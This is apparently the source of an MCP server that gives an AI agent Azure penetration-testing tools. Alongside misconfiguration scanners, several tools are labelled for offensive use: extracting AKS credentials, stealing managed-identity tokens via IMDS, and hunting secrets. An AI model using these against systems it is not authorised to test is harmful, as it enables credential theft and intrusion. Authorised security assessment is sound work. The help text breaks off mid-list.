#!/usr/bin/env node
import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import {
  CallToolRequestSchema,
  ListToolsRequestSchema,
} from "@modelcontextprotocol/sdk/types.js";
import { AzureCliCredential, DefaultAzureCredential, ChainedTokenCredential } from "@azure/identity";
import { SubscriptionClient } from "@azure/arm-subscriptions";
import { ResourceManagementClient } from "@azure/arm-resources";
import { StorageManagementClient } from "@azure/arm-storage";
import { NetworkManagementClient } from "@azure/arm-network";
import { AuthorizationManagementClient } from "@azure/arm-authorization";
import { SqlManagementClient } from "@azure/arm-sql";
import { KeyVaultManagementClient } from "@azure/arm-keyvault";
import { CosmosDBManagementClient } from "@azure/arm-cosmosdb";
import { ComputeManagementClient } from "@azure/arm-compute";
import { ContainerServiceClient } from "@azure/arm-containerservice";
import { ContainerRegistryManagementClient } from "@azure/arm-containerregistry";
import { BlobServiceClient } from "@azure/storage-blob";
import * as azdev from "azure-devops-node-api";
import PDFDocument from "pdfkit";
import { marked } from "marked";
import { createObjectCsvWriter } from "csv-writer";
import * as fs from "fs";
import * as path from "path";
import * as k8s from "@kubernetes/client-node";

// Initialize Azure credential - PRIORITIZE Azure CLI over VS Code extension
// This fixes the issue where VS Code's internal service principal is used instead of user's az login
const credential = new ChainedTokenCredential(
  new AzureCliCredential(),      // Try Azure CLI first (your az login)
  new DefaultAzureCredential()   // Fallback to other methods
);

// ========== AZURE LOCATIONS ==========
// All Azure regions/locations
const AZURE_LOCATIONS = [
  // Americas
  "eastus", "eastus2", "westus", "westus2", "westus3", "centralus", "northcentralus", "southcentralus", "westcentralus",
  "canadacentral", "canadaeast", "brazilsouth", "brazilsoutheast",
  // Europe
  "northeurope", "westeurope", "uksouth", "ukwest", "francecentral", "francesouth",
  "germanywestcentral", "germanynorth", "switzerlandnorth", "switzerlandwest",
  "norwayeast", "norwaywest", "swedencentral", "polandcentral", "italynorth", "spaincentral",
  // Asia Pacific
  "eastasia", "southeastasia", "australiaeast", "australiasoutheast", "australiacentral", "australiacentral2",
  "japaneast", "japanwest", "koreacentral", "koreasouth",
  "centralindia", "southindia", "westindia", "jioindiawest", "jioindiacentral",
  // Middle East & Africa
  "uaenorth", "uaecentral", "qatarcentral", "southafricanorth", "southafricawest", "israelcentral"
];

// Common Azure locations (most used)
const COMMON_LOCATIONS = [
  "eastus", "eastus2", "westus2", "westeurope", "northeurope",
  "southeastasia", "australiaeast", "uksouth", "centralindia", "japaneast"
];

// Helper to resolve locations from user input
function resolveLocations(location?: string): string[] | null {
  if (!location) return null; // No filter - return all
  if (location.toLowerCase() === "all") return AZURE_LOCATIONS;
  if (location.toLowerCase() === "common") return COMMON_LOCATIONS;
  return location.split(",").map(l => l.trim().toLowerCase());
}

// Helper to filter resources by location
function filterByLocation<T extends { location?: string }>(resources: T[], locations: string[] | null): T[] {
  if (!locations) return resources; // No filter
  return resources.filter(r => r.location && locations.includes(r.location.toLowerCase()));
}

// Create MCP server instance
const server = new Server(
  {
    name: "stratos-mcp",
    "version": "1.9.1",
  },
  {
    capabilities: {
      tools: {},
    },
  }
);

// List available tools
server.setRequestHandler(ListToolsRequestSchema, async () => {
  return {
    tools: [
      {
        name: "help",
        description: "Display comprehensive help information about all available Azure penetration testing tools and usage examples",
        inputSchema: {
          type: "object",
          properties: {},
        },
      },
      {
        name: "list_active_locations",
        description: "Discover which Azure locations have resources deployed. Quick scan to identify active regions before deep scanning. Checks resource groups, VMs, storage accounts, and AKS clusters.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            scanMode: {
              type: "string",
              enum: ["common", "all"],
              description: "Preset scan mode: 'common' (10 locations) or 'all' (45+ locations). Default: common",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "scan_all_locations",
        description: "Scan multiple Azure locations for resources. Supports: vms, storage, nsgs, aks, sql, keyvaults, public_ips, all. Specify custom locations OR use presets ('common'=10 locations, 'all'=45+ locations).",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceType: {
              type: "string",
              enum: ["vms", "storage", "nsgs", "aks", "sql", "keyvaults", "public_ips", "all"],
              description: "Type of resource to scan: vms, storage, nsgs, aks, sql, keyvaults, public_ips, all",
            },
            locations: {
              type: "string",
              description: "Custom locations to scan (comma-separated). Examples: 'eastus' or 'eastus,westeurope,southeastasia'. Use 'common' for 10 main locations or 'all' for 45+ locations.",
            },
          },
          required: ["subscriptionId", "resourceType"],
        },
      },
      {
        name: "enumerate_subscriptions",
        description: "Enumerate all Azure subscriptions accessible with current credentials. Returns subscription ID, name, state, and tenant ID.",
        inputSchema: {
          type: "object",
          properties: {},
        },
      },
      {
        name: "enumerate_resource_groups",
        description: "Enumerate all resource groups in a specific subscription. Returns name, location, ID, and tags. Supports location filtering.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID (format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx)",
            },
            location: {
              type: "string",
              description: "Filter by location(s): single (e.g., 'eastus'), multiple (e.g., 'eastus,westeurope'), or preset ('common', 'all')",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "enumerate_resources",
        description: "Enumerate all resources in a subscription or resource group. Can filter by resource type and location. Returns resource name, type, location, ID, and tags.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Resource group name to filter by",
            },
            resourceType: {
              type: "string",
              description: "Optional: Filter by resource type (e.g., Microsoft.Storage/storageAccounts, Microsoft.Compute/virtualMachines, Microsoft.Network/networkSecurityGroups)",
            },
            location: {
              type: "string",
              description: "Filter by location(s): single (e.g., 'eastus'), multiple (e.g., 'eastus,westeurope'), or preset ('common', 'all')",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "get_resource_details",
        description: "Get detailed configuration and properties of a specific Azure resource. Useful for analyzing security settings, network configs, encryption status, etc.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Resource group name",
            },
            resourceProvider: {
              type: "string",
              description: "Resource provider (e.g., Microsoft.Storage, Microsoft.Compute, Microsoft.Network)",
            },
            resourceType: {
              type: "string",
              description: "Resource type (e.g., storageAccounts, virtualMachines, networkSecurityGroups)",
            },
            resourceName: {
              type: "string",
              description: "Resource name",
            },
          },
          required: ["subscriptionId", "resourceGroup", "resourceProvider", "resourceType", "resourceName"],
        },
      },
      {
        name: "analyze_storage_security",
        description: "Analyze security configuration of all storage accounts in a subscription. Checks: public blob access, firewall rules, encryption, secure transfer (HTTPS), private endpoints, minimum TLS version. Returns prioritized security findings with risk levels (CRITICAL/HIGH/MEDIUM/LOW).",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "analyze_nsg_rules",
        description: "Automated Network Security Group (NSG) security analysis. Identifies: open management ports (RDP 3389, SSH 22, WinRM 5985/5986), database ports (SQL 1433, MySQL 3306, PostgreSQL 5432, MongoDB 27017), wildcard source rules (0.0.0.0/0, Internet, Any), overly permissive rules. Returns findings with risk severity and remediation recommendations.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            nsgName: {
              type: "string",
              description: "Optional: Analyze specific NSG by name",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "enumerate_public_ips",
        description: "Enumerate all public IP addresses in a subscription to map internet-exposed attack surface. Returns: IP address, DNS name, allocation method (Static/Dynamic), associated resource (VM, Load Balancer, App Gateway, etc.), resource group, location. Critical for identifying external entry points.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "enumerate_rbac_assignments",
        description: "Enumerate Role-Based Access Control (RBAC) assignments to identify who has access to what. Returns: principal name and type (User/ServicePrincipal/Group), role definition (Owner/Contributor/Reader/Custom), scope (Subscription/ResourceGroup/Resource), principal ID. Useful for identifying privileged accounts, service principals with excessive permissions, and potential privilege escalation paths.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            scope: {
              type: "string",
              description: "Optional: Specific scope to analyze (e.g., /subscriptions/{id}/resourceGroups/{rg}). If not provided, analyzes entire subscription.",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "scan_sql_databases",
        description: "Comprehensive SQL Database security scanner. Checks: TDE encryption status, firewall rules (detects 0.0.0.0-255.255.255.255 allow-all), Azure AD authentication vs SQL auth, auditing enabled, public endpoint exposure, threat detection. Returns CRITICAL/HIGH/MEDIUM findings with CWE references and attack vectors.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "analyze_key_vault_security",
        description: "Key Vault security assessment. Checks: soft delete disabled (data loss risk), purge protection disabled, public network access enabled, RBAC vs Access Policies, secret/certificate expiration, diagnostic logging. Returns risk-scored findings (CRITICAL/HIGH/MEDIUM/LOW) with remediation guidance.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "analyze_cosmos_db_security",
        description: "Cosmos DB security analyzer. Checks: public network access enabled, firewall rules (IP restrictions), encryption at rest, automatic failover, backup retention policy, virtual network rules. Returns security findings with compliance mapping.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "analyze_vm_security",
        description: "Virtual Machine security scanner. Checks: OS disk encryption (BitLocker/dm-crypt), data disk encryption, security extensions (Microsoft Defender, Azure Monitor Agent), boot diagnostics storage access, patch management status, Just-in-Time VM access. Returns vulnerability findings with exploitation paths.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "scan_aks_clusters",
        description: "Azure Kubernetes Service (AKS) security assessment. Checks: RBAC enabled, network policies configured, pod security policies, private cluster mode, Azure Policy integration, API server authorized IP ranges, Azure Active Directory integration. Returns Kubernetes-specific security findings.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "scan_container_registries",
        description: "Azure Container Registry (ACR) security scanner. Checks: admin user enabled (high risk), public network access, vulnerability scanning enabled (Defender for Containers), content trust (image signing), network rules, anonymous pull access. Returns container security findings.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "enumerate_service_principals",
        description: "Enumerate all service principals (application identities) in the tenant. Returns: service principal names, application IDs, credential expiration dates, application permissions (Microsoft Graph API), owner information, orphaned/unused SPNs. Critical for identifying over-privileged applications and credential lifecycle management.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID (used for authentication context)",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "enumerate_managed_identities",
        description: "Enumerate all managed identities (system-assigned and user-assigned) across subscription. Returns: identity type, associated resources, role assignments, scope of access, cross-subscription permissions. Essential for understanding passwordless authentication patterns and potential privilege escalation paths.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "scan_storage_containers",
        description: "Deep scan of storage account containers and blobs. Lists all containers, checks container-level public access, enumerates blobs, detects sensitive files (backups, configs, keys: *.bak, web.config, appsettings.json, *.key, *.pem, *.sql). Identifies SAS tokens, checks blob encryption, finds orphaned blobs. CRITICAL for data exposure assessment.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            storageAccountName: {
              type: "string",
              description: "Optional: Scan specific storage account. If omitted, scans all storage accounts with public blob access.",
            },
            maxBlobsPerContainer: {
              type: "number",
              description: "Optional: Maximum blobs to list per container (default: 100, prevents timeout on large containers)",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "generate_security_report",
        description: "Generate comprehensive security assessment report from scan results. NEW: Supports PDF, HTML, CSV export. Produces executive summary, risk prioritization, findings by severity (CRITICAL/HIGH/MEDIUM/LOW), remediation matrix, compliance mapping (CIS/NIST), and detailed vulnerability analysis. Aggregates all security scanner results into professional deliverable.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID to report on",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            format: {
              type: "string",
              description: "Output format: 'markdown' (default), 'json', 'html', 'pdf', or 'csv'",
              enum: ["markdown", "json", "html", "pdf", "csv"],
            },
            outputFile: {
              type: "string",
              description: "Optional: Save report to file (e.g., C:\\\\reports\\\\security-report.pdf)",
            },
            fullScan: {
              type: "boolean",
              description: "Run comprehensive scan using all 25 tools (default: false - quick scan only)",
            },
            includeRemediation: {
              type: "boolean",
              description: "Include detailed remediation guidance (default: true)",
            },
            includeCompliance: {
              type: "boolean",
              description: "Include compliance framework mapping (default: true)",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "analyze_attack_paths",
        description: "Identify and map attack paths from public exposure to sensitive resources. Analyzes: privilege escalation chains (RBAC roles → resources), lateral movement opportunities (VM → managed identity → secrets), exposed credentials to resource access, public IP → NSG → VM → identity → data flows. Returns exploitation scenarios with step-by-step attack chains.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID to analyze",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
            startFrom: {
              type: "string",
              description: "Optional: Starting point for attack path analysis ('public-ips', 'storage', 'vms', 'identities'). Default: analyze all entry points.",
              enum: ["public-ips", "storage", "vms", "identities", "all"],
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "get_aks_credentials",
        description: "Extract AKS cluster credentials and kubeconfig for kubectl access. Returns: cluster FQDN, API server endpoint, admin credentials (if available), service principal details, managed identity info. OFFENSIVE USE: Obtain cluster access for manual kubectl exploitation, RBAC testing, pod deployment, secret extraction.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Resource group name containing AKS cluster",
            },
            clusterName: {
              type: "string",
              description: "AKS cluster name",
            },
            adminAccess: {
              type: "boolean",
              description: "Attempt to get admin credentials (requires Azure RBAC permissions). Default: false (user credentials)",
            },
          },
          required: ["subscriptionId", "resourceGroup", "clusterName"],
        },
      },
      {
        name: "enumerate_aks_identities",
        description: "Enumerate AKS cluster identities and service principals. Returns: cluster managed identity, kubelet identity, service principal (if used), identity role assignments, Key Vault access, storage account permissions. OFFENSIVE USE: Identify privilege escalation paths from pod → managed identity → Azure resources.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Resource group name containing AKS cluster",
            },
            clusterName: {
              type: "string",
              description: "AKS cluster name",
            },
          },
          required: ["subscriptionId", "resourceGroup", "clusterName"],
        },
      },
      {
        name: "scan_aks_node_security",
        description: "Scan AKS node (VM) security configuration. Checks: OS disk encryption, SSH access enabled, public IPs on nodes, node pool configuration, auto-upgrade enabled, node security patches, privileged container capabilities. OFFENSIVE USE: Find vulnerable nodes for container escape, identify nodes with SSH access for lateral movement.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Resource group name containing AKS cluster",
            },
            clusterName: {
              type: "string",
              description: "AKS cluster name",
            },
          },
          required: ["subscriptionId", "resourceGroup", "clusterName"],
        },
      },
      {
        name: "test_aks_imds_access",
        description: "Test Azure Instance Metadata Service (IMDS) accessibility from AKS cluster. Checks if IMDS endpoint 169.254.169.254 is reachable, tests managed identity token retrieval, validates network restrictions. OFFENSIVE USE: Critical for pod escape attacks - if IMDS accessible from pods, can steal managed identity tokens to access Azure resources (Key Vault, Storage, etc.).",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Resource group name containing AKS cluster",
            },
            clusterName: {
              type: "string",
              description: "AKS cluster name",
            },
          },
          required: ["subscriptionId", "resourceGroup", "clusterName"],
        },
      },
      {
        name: "scan_azure_devops",
        description: "Azure DevOps security scanner. Enumerates: organizations, projects, repositories, pipelines, service connections, variable groups, PAT tokens. Checks for: exposed secrets in repos, over-privileged service connections, insecure pipeline configurations, leaked credentials. OFFENSIVE USE: Find deployment credentials, API keys in source code, service principal secrets in pipelines.",
        inputSchema: {
          type: "object",
          properties: {
            organizationUrl: {
              type: "string",
              description: "Azure DevOps organization URL (e.g., https://dev.azure.com/yourorg)",
            },
            personalAccessToken: {
              type: "string",
              description: "Personal Access Token (PAT) for authentication - requires Read access to Code, Build, Release",
            },
            scanRepositories: {
              type: "boolean",
              description: "Scan repositories for hardcoded secrets (default: true)",
            },
            scanPipelines: {
              type: "boolean",
              description: "Scan pipelines for exposed credentials (default: true)",
            },
          },
          required: ["organizationUrl", "personalAccessToken"],
        },
      },
      // ========== NEW SECURITY TOOLS ==========
      {
        name: "analyze_function_apps",
        description: "Azure Functions security analysis: authentication settings, managed identity, VNet integration, CORS configuration, application settings for secrets, runtime version vulnerabilities",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "analyze_app_service_security",
        description: "App Service security analysis: HTTPS-only, minimum TLS version, authentication, managed identity, VNet integration, IP restrictions, remote debugging status",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "analyze_firewall_policies",
        description: "Azure Firewall and NSG rule analysis: overly permissive rules, any-to-any rules, management port exposure, threat intelligence integration",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "analyze_logic_apps",
        description: "Logic Apps security analysis: authentication, access control, managed identity usage, exposed endpoints, workflow triggers security",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Optional: Filter by specific resource group",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "analyze_rbac_privilege_escalation",
        description: "Deep RBAC analysis for privilege escalation paths: role assignment permissions, custom role vulnerabilities, subscription-level access, management group permissions",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            targetPrincipal: {
              type: "string",
              description: "Optional: Specific principal ID to analyze escalation paths for",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "detect_persistence_mechanisms",
        description: "Identify Azure persistence mechanisms: automation accounts, runbooks, Logic Apps triggers, scheduled tasks, webhook endpoints, custom script extensions",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
          },
          required: ["subscriptionId"],
        },
      },
      {
        name: "scan_aks_service_accounts",
        description: "Scan AKS cluster for service account security issues: default SA auto-mount enabled, SAs with cluster-wide permissions, Workload Identity not configured, SA impersonation allowed, legacy non-expiring tokens. Returns findings with MITRE ATT&CK mappings and remediation steps.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Resource group containing the AKS cluster",
            },
            clusterName: {
              type: "string",
              description: "AKS cluster name",
            },
          },
          required: ["subscriptionId", "resourceGroup", "clusterName"],
        },
      },
      {
        name: "hunt_aks_secrets",
        description: "Hunt for secrets in AKS cluster: enumerate K8s secrets, secrets in env vars, Azure Key Vault access, storage account credentials, ConfigMap secrets, mounted secret files, service principal credentials, container registry credentials. Returns extraction commands and remediation.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Resource group containing the AKS cluster",
            },
            clusterName: {
              type: "string",
              description: "AKS cluster name",
            },
          },
          required: ["subscriptionId", "resourceGroup", "clusterName"],
        },
      },
      {
        name: "scan_aks_full",
        description: "🚀 FULL AKS SECURITY SCAN - Runs ALL 7 AKS security checks in one shot: cluster security, credentials extraction, identity enumeration, node security, IMDS access testing, service account analysis, and secret hunting. Comprehensive Kubernetes security assessment.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Resource group containing the AKS cluster",
            },
            clusterName: {
              type: "string",
              description: "AKS cluster name",
            },
          },
          required: ["subscriptionId", "resourceGroup", "clusterName"],
        },
      },
      {
        name: "scan_aks_live",
        description: "🔴 LIVE AKS SECURITY SCAN via Kubernetes API - Directly connects to cluster API server and performs real-time security analysis: enumerates secrets, service accounts, RBAC bindings, privileged pods, network policies, exposed services, and more. Requires cluster access.",
        inputSchema: {
          type: "object",
          properties: {
            subscriptionId: {
              type: "string",
              description: "Azure subscription ID",
            },
            resourceGroup: {
              type: "string",
              description: "Resource group containing the AKS cluster",
            },
            clusterName: {
              type: "string",
              description: "AKS cluster name",
            },
            namespace: {
              type: "string",
              description: "Specific namespace to scan (optional, scans all namespaces if not specified)",
            },
          },
          required: ["subscriptionId", "resourceGroup", "clusterName"],
        },
      },
    ],
  };
});

// Handle tool execution
server.setRequestHandler(CallToolRequestSchema, async (request) => {
  try {
    switch (request.params.name) {
      case "help": {
        const helpText = `# Stratos - Azure Security Assessment MCP Server

## Overview
This MCP server provides 35 comprehensive tools for Azure security assessment and penetration testing. All tools use your current Azure CLI credentials (az login).

**Version:** 1.9.0
**Total Tools:** 35
**Latest Features:** Multi-location scanning, location filtering, Azure DevOps security scanning, PDF/HTML/CSV report export

## Quick Start Examples

\`\`\`bash
# 1. Discover active Azure locations
list_active_locations subscriptionId="YOUR_SUB" scanMode="common"

# 2. Scan all locations for VMs
scan_all_locations subscriptionId="YOUR_SUB" resourceType="vms" locations="all"

# 3. Generate PDF security report
generate_security_report subscriptionId="YOUR_SUB" format="pdf" outputFile="C:\\\\report.pdf"

# 4. Filter resources by location
enumerate_resources subscriptionId="YOUR_SUB" location="eastus,westeurope"
\`\`\`

---

## Available Tools (35)

### MULTI-LOCATION TOOLS (NEW!)

### 1. list_active_locations
**Description:** Discover which Azure locations have resources deployed
**Use Cases:**
  - Quick reconnaissance to find active regions
  - Identify where to focus deeper scans
  - Map geographical footprint
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - scanMode (optional): 'common' (10 locations) or 'all' (45+ locations)
**Example:**
  subscriptionId: "YOUR_SUB"
  scanMode: "all"

### 2. scan_all_locations
**Description:** Scan multiple Azure locations for specific resource types
**Use Cases:**
  - Enumerate all VMs across regions
  - Find storage accounts globally
  - Discover AKS clusters in all locations
**Resource Types:** vms, storage, nsgs, aks, sql, keyvaults, public_ips, all
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceType (required): Type of resource to scan
  - locations (optional): 'common', 'all', or comma-separated list
**Example:**
  subscriptionId: "YOUR_SUB"
  resourceType: "storage"
  locations: "all"

---

### ENUMERATION TOOLS (3-11)

### 3. help
**Description:** Display this comprehensive help information
**Usage:** Call this tool anytime to see available features and examples
**Parameters:** None

### 4. enumerate_subscriptions
**Description:** List all Azure subscriptions you have access to
**Use Cases:** 
  - Discover available target environments
  - Identify subscription IDs for further enumeration
  - Verify authentication and access scope
**Parameters:** None
**Example Output:** Subscription ID, name, state, tenant ID
**Best Practice:** Start here to identify which subscriptions to assess

### 5. enumerate_resource_groups
**Description:** List all resource groups within a subscription
**Use Cases:**
  - Map organizational structure
  - Identify resource groupings for targeted assessment
  - Discover naming conventions and patterns
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - location (optional): Filter by location(s) - single, comma-separated, 'common', or 'all'
  - subscriptionId (required): Azure subscription ID
**Example:** 
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"

### 4. enumerate_resources
**Description:** Enumerate all resources in a subscription or resource group
**Use Cases:**
  - Comprehensive asset inventory
  - Identify exposed services (VMs, storage, databases)
  - Find misconfigured resources
  - Discover resource types and counts
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by specific resource group
  - resourceType (optional): Filter by type (e.g., Microsoft.Storage/storageAccounts)
**Common Resource Types:**
  - Microsoft.Compute/virtualMachines (VMs)
  - Microsoft.Storage/storageAccounts (Storage)
  - Microsoft.Network/networkSecurityGroups (NSGs/Firewalls)
  - Microsoft.Network/publicIPAddresses (Public IPs)
  - Microsoft.Sql/servers (SQL Servers)
  - Microsoft.KeyVault/vaults (Key Vaults)
  - Microsoft.Network/virtualNetworks (VNets)
  - Microsoft.ContainerService/managedClusters (AKS/Kubernetes)
**Example 1 - All resources:** 
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"
**Example 2 - Only storage accounts:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"
  resourceType: "Microsoft.Storage/storageAccounts"

### 5. get_resource_details
**Description:** Get detailed configuration of a specific resource
**Use Cases:**
  - Analyze security configurations
  - Check encryption settings
  - Review network configurations
  - Identify misconfigurations
  - Extract sensitive information
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (required): Resource group name
  - resourceProvider (required): Provider (e.g., Microsoft.Storage)
  - resourceType (required): Type (e.g., storageAccounts)
  - resourceName (required): Resource name
**Example:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"
  resourceGroup: "RG-TMS-STORAGE-NCU-I"
  resourceProvider: "Microsoft.Storage"
  resourceType: "storageAccounts"
  resourceName: "tmslogsstncui"

### 6. analyze_storage_security (NEW - Phase 1)
**Description:** Automated security analysis of all storage accounts
**Use Cases:**
  - Identify publicly accessible storage (anonymous blob access)
  - Find unencrypted storage accounts
  - Check for HTTP-only access (missing HTTPS enforcement)
  - Verify firewall/network rules
  - Detect weak TLS versions (< 1.2)
  - Validate private endpoint usage
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
**Security Checks:**
  - CRITICAL: HTTPS-only disabled, missing encryption
  - HIGH: Public blob access enabled, weak TLS version
  - MEDIUM: No firewall rules, missing private endpoints
  - LOW: Shared key access enabled
**Example:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"
**Output:** Risk-scored findings with CWE references and remediation steps

### 7. analyze_nsg_rules (NEW - Phase 1)
**Description:** Automated Network Security Group security analysis
**Use Cases:**
  - Identify internet-exposed management ports (RDP, SSH, WinRM)
  - Find open database ports (SQL, MySQL, PostgreSQL, MongoDB)
  - Detect wildcard rules (0.0.0.0/0, *, Internet, Any)
  - Locate overly permissive high-priority rules
  - Map attack surface and entry points
**Parameters:**
  - subscriptionId (required): Azure subscription ID
  - resourceGroup (optional): Filter by resource group
  - nsgName (optional): Analyze specific NSG
**High-Risk Detections:**
  - CRITICAL: Management ports (22, 3389, 5985) + wildcard source
  - CRITICAL: All ports (*) exposed to Internet
  - HIGH: Database ports + wildcard source
  - MEDIUM: High-priority Internet-facing rules
**Example 1 - All NSGs:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"
**Example 2 - Specific NSG:**
  subscriptionId: "1f0c8a8b-ad4a-4219-8190-a4968a4693ca"
  resourceGroup: "RG-TMS-AKS-NCU-I"
  nsgName: "tms-aks-nsg-ncu-i"
**Output:** Risk-scored findings with attack vectors and remediation

### 8. enumerate_public_ips (NEW - Phase 1)
**Description:** Map all public IP addresses (internet-exposed attack surface)
**Use Cases:**
